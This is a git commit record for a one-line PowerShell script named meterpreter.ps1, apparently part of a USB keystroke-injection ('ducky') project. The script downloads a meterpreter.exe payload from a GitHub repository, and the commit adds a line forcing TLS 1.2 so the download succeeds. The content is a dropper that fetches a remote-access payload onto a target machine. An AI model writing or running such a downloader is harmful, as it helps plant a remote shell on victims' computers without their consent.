48b773da2b13eb31ad6a1892ad9bf5c8ccbbbdaa
Ashish D'Souza <ashish.dsouza@students.polytech.k12.de.us>
2018-08-01 20:40:45 -0400

    Update meterpreter.ps1

--- meterpreter.ps1
+++ meterpreter.ps1
@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "http://github.com/computer-geek64/ducky/raw/master/meterpreter.exe" -OutFile meterpreter.exe
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri http://github.com/computer-geek64/ducky/raw/master/meterpreter.exe -OutFile meterpreter.exe
